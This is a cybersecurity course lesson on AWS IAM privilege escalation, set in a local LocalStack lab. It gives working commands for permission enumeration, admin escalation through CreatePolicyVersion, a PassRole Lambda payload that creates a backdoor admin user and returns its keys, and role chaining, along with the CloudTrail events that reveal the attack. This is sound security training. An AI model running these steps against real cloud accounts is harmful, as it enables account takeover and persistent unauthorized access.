---
title: "Cloud Practice — IAM Privilege Escalation"
tags: [cloud-practice, AWS, IAM, privilege-escalation, Pacu, LocalStack,
       iam-privesc, PassRole, CreatePolicyVersion, role-chaining, lab]
module: 04-BroadSurface-02
day: 197
related_topics:
  - IAM Misconfiguration Attacks (Day 183)
  - AWS Enumeration with Pacu (Day 186)
  - Cloud Full Attack Lab (Day 192)
  - Cloud Security Review (Day 196)
---

# Day 197 — Cloud Practice: IAM Privilege Escalation

> "IAM privilege escalation is the cloud equivalent of sudo misconfiguration. The
> technique is slightly different — you are abusing policy permissions rather than
> binary SUID bits — but the logic is identical. You have a low-privilege identity,
> you find a permission that lets you modify your own access, and you pull yourself
> up. Today you run every escalation path we covered until each one is muscle memory."
>
> — Ghost

---

## Goals

By the end of today's practice session you will be able to:

1. Enumerate IAM permissions using both Pacu and manual CLI calls.
2. Execute `iam:CreatePolicyVersion` escalation without reference materials.
3. Execute `iam:PassRole` + Lambda escalation end-to-end.
4. Chain roles from a low-privilege starting role to admin access.
5. Identify which permissions are present and select the fastest escalation path.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| IAM Misconfiguration Attacks | Day 183 |
| AWS Enumeration with Pacu | Day 186 |
| Cloud Full Attack Lab | Day 192 |
| LocalStack installed | `pip install localstack awscli-local` |

---

## Lab Setup

```bash
cd learn-security/04-BroadSurface-02/samples/iam-privesc-practice/
docker compose up -d

# LocalStack with pre-configured IAM scenario
# Starting identity: arn:aws:iam::000000000000:user/junior-dev
# AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY in .env file
# LocalStack endpoint: http://localhost:4566

source .env
export AWS_ENDPOINT_URL="http://localhost:4566"
export AWS_DEFAULT_REGION="us-east-1"

# Verify starting identity
aws sts get-caller-identity
# → arn:aws:iam::000000000000:user/junior-dev
```

---

## Block 1 — Enumeration (45 min)

### 1.1 — Manual Enumeration

Do this without Pacu first. Understand every call before you automate it.

```bash
# Who am I?
aws sts get-caller-identity

# What policies are attached directly to my user?
aws iam list-attached-user-policies --user-name junior-dev

# What inline policies do I have?
aws iam list-user-policies --user-name junior-dev

# What groups am I in?
aws iam list-groups-for-user --user-name junior-dev

# What does each attached managed policy allow?
POLICY_ARN=$(aws iam list-attached-user-policies \
  --user-name junior-dev \
  --query 'AttachedPolicies[0].PolicyArn' --output text)

VERSION=$(aws iam get-policy \
  --policy-arn $POLICY_ARN \
  --query 'Policy.DefaultVersionId' --output text)

aws iam get-policy-version \
  --policy-arn $POLICY_ARN \
  --version-id $VERSION \
  | jq '.PolicyVersion.Document'

# What roles exist? Which ones can I assume?
aws iam list-roles | jq '.Roles[] | {Name: .RoleName, Trust: .AssumeRolePolicyDocument}'
```

### 1.2 — Automated Enumeration with enumerate-iam

```bash
# enumerate-iam brute-forces which API calls succeed
git clone https://github.com/andresriancho/enumerate-iam
cd enumerate-iam
pip install -r requirements.txt

python enumerate_iam.py \
  --access-key $AWS_ACCESS_KEY_ID \
  --secret-key $AWS_SECRET_ACCESS_KEY \
  --session-token $AWS_SESSION_TOKEN \
  --endpoint-url http://localhost:4566 \
  --region us-east-1

# Record every permission returned — this is your escalation map
```

### 1.3 — Pacu Enumeration

```bash
# Start Pacu
pacu

# Create a new session
> import_keys junior-dev

# Run IAM enumeration module
> run iam__enum_permissions
> run iam__enum_users_roles_policies_groups

# Check what Pacu found
> whoami
> data IAM
```

**Checkpoint:** Before moving to Block 2, write down (without notes):
- Your current permissions
- Which escalation paths are available based on what you have
- The fastest path to admin

---

## Block 2 — CreatePolicyVersion Escalation (30 min)

Only attempt this if your enumeration revealed `iam:CreatePolicyVersion` and
`iam:SetDefaultPolicyVersion`.

```bash
# Identify the policy ARN attached to your user
POLICY_ARN="arn:aws:iam::000000000000:policy/JuniorDevPolicy"

# Check how many versions exist (max 5; oldest must be deleted to add new)
aws iam list-policy-versions --policy-arn $POLICY_ARN

# Create a new version with full admin permissions
cat > /tmp/admin-policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "*",
    "Resource": "*"
  }]
}
EOF

aws iam create-policy-version \
  --policy-arn $POLICY_ARN \
  --policy-document file:///tmp/admin-policy.json \
  --set-as-default

# Verify — your policy should now allow everything
aws iam get-policy-version \
  --policy-arn $POLICY_ARN \
  --version-id v2

# Confirm admin access
aws iam list-users    # Should return all users
aws s3 ls             # Should list all buckets
```

**After success:** Reset the lab and do it again from memory. Target: under 5 minutes.

---

## Block 3 — PassRole + Lambda Escalation (45 min)

Only attempt this if enumeration revealed `iam:PassRole` and Lambda permissions.

```bash
# Identify the high-privilege role you can pass
aws iam list-roles | jq '.Roles[] | select(.RoleName | contains("admin")) | .Arn'
HIGH_PRIV_ROLE="arn:aws:iam::000000000000:role/AdminExecutionRole"

# Create the Lambda payload
mkdir -p /tmp/lambda-payload
cat > /tmp/lambda-payload/index.py << 'EOF'
import boto3, json, os

def handler(event, context):
    """Running as AdminExecutionRole — we have admin permissions here."""
    iam = boto3.client("iam", endpoint_url=os.environ.get("AWS_ENDPOINT_URL"))

    # Create a backdoor user with admin access
    iam.create_user(UserName="lambda-backdoor")
    iam.attach_user_policy(
        UserName="lambda-backdoor",
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    key = iam.create_access_key(UserName="lambda-backdoor")
    return {
        "statusCode": 200,
        "body": json.dumps({
            "KeyId": key["AccessKey"]["AccessKeyId"],
            "Secret": key["AccessKey"]["SecretAccessKey"]
        })
    }
EOF

# Zip the payload
cd /tmp/lambda-payload && zip -r ../payload.zip . && cd -

# Create the Lambda with the high-priv role (PassRole is the escalation here)
aws lambda create-function \
  --function-name privesc-backdoor \
  --runtime python3.11 \
  --role $HIGH_PRIV_ROLE \
  --handler index.handler \
  --zip-file fileb:///tmp/payload.zip

# Invoke it
RESULT=$(aws lambda invoke \
  --function-name privesc-backdoor \
  --payload '{}' \
  /tmp/lambda-output.json)

cat /tmp/lambda-output.json | jq .

# Extract the backdoor credentials
export NEW_KEY_ID=$(cat /tmp/lambda-output.json | jq -r '.body | fromjson | .KeyId')
export NEW_SECRET=$(cat /tmp/lambda-output.json | jq -r '.body | fromjson | .Secret')
echo "Backdoor key: $NEW_KEY_ID"

# Verify admin access with the backdoor key
AWS_ACCESS_KEY_ID=$NEW_KEY_ID \
AWS_SECRET_ACCESS_KEY=$NEW_SECRET \
  aws iam list-users
```

**After success:** What CloudTrail events did this generate? List them in order:
1. `CreateFunction` — with `high_priv_role_arn` in the request
2. `InvokeFunction` — your identity calling the function
3. `CreateUser` — from the Lambda execution role
4. `AttachUserPolicy` — AdministratorAccess attached
5. `CreateAccessKey` — backdoor key created

---

## Block 4 — Role Chaining (30 min)

```bash
# Identify roles in the trust chain
# Look for a low-priv role that can assume a medium-priv role
# that can assume a high-priv role

# Step 1: Assume the first role in the chain
STEP1=$(aws sts assume-role \
  --role-arn arn:aws:iam::000000000000:role/ReadOnlyRole \
  --role-session-name chain-step1)

export AWS_ACCESS_KEY_ID=$(echo $STEP1 | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $STEP1 | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $STEP1 | jq -r '.Credentials.SessionToken')

aws sts get-caller-identity
# → arn:aws:sts::000000000000:assumed-role/ReadOnlyRole/chain-step1

# Step 2: From ReadOnlyRole, assume a more privileged role
STEP2=$(aws sts assume-role \
  --role-arn arn:aws:iam::000000000000:role/DataEngineerRole \
  --role-session-name chain-step2)

export AWS_ACCESS_KEY_ID=$(echo $STEP2 | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $STEP2 | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $STEP2 | jq -r '.Credentials.SessionToken')

aws sts get-caller-identity
# → arn:aws:sts::000000000000:assumed-role/DataEngineerRole/chain-step2

# Step 3: From DataEngineerRole, assume admin
STEP3=$(aws sts assume-role \
  --role-arn arn:aws:iam::000000000000:role/escalation-target-role \
  --role-session-name chain-step3)

export AWS_ACCESS_KEY_ID=$(echo $STEP3 | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $STEP3 | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $STEP3 | jq -r '.Credentials.SessionToken')

aws sts get-caller-identity
# → arn:aws:sts::000000000000:assumed-role/escalation-target-role/chain-step3

# Confirm admin
aws iam list-users
```

---

## Block 5 — Speed Run (15 min)

Reset the lab. New scenario: you are given a fresh `junior-dev` credential set.
You have 15 minutes. The objective: admin access.

Rules:
1. No notes or reference materials.
2. You choose the escalation path — enumerate first.
3. Prove admin access by creating a user named `speed-run-complete`.

Record your time. Target under 12 minutes.

---

## Key Takeaways

1. **Enumeration drives escalation path selection.** The same starting permissions
   can have multiple escalation paths. Fast enumeration → optimal path selection.
2. **`iam:CreatePolicyVersion` is the most direct path.** No infrastructure needed —
   edit the policy, set as default, done. Three API calls to admin.
3. **PassRole + Lambda requires infrastructure deployment** but works even if your
   own policy cannot be modified — you ride the Lambda's execution role.
4. **Role chaining is stealthy** because each `AssumeRole` call has a normal session
   name and trusts the previous role. Detection requires correlating session chains,
   not individual events.
5. **Write the escalation path before executing it.** Random API calls create noise.
   A planned sequence of 3–5 calls completes faster and looks less like an attacker.

---

## Exercises

1. Run all three escalation paths against the lab without any notes. Time each one.
   Record: time to enumerate, time to execute, total time. Target: <15 min total.
2. Write a Python script that takes any set of AWS credentials, enumerates the
   most common dangerous permissions (`iam:CreatePolicyVersion`, `iam:PassRole`,
   `iam:CreateUser`, `iam:AttachUserPolicy`, `sts:AssumeRole` on specific roles),
   and outputs the fastest available escalation path.
3. Run Pacu's `iam__privesc_scan` against the lab. Compare its output to your
   manual enumeration. Are there any paths Pacu found that you missed?
4. Research: `iam:UpdateAssumeRolePolicy` — how can this permission be used for
   privilege escalation? Write the exploit steps. What is the fix?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q197.1, Q197.2 …).
> Follow-up questions use hierarchical numbering (Q197.1.1, Q197.1.2 …).

---

## Navigation

← Previous: [Day 196 — Cloud Security Review](DAY-0196-Cloud-Security-Review.md)
→ Next: [Day 198 — Cloud Practice: S3 Attacks](DAY-0198-Cloud-Practice-S3-Attacks.md)
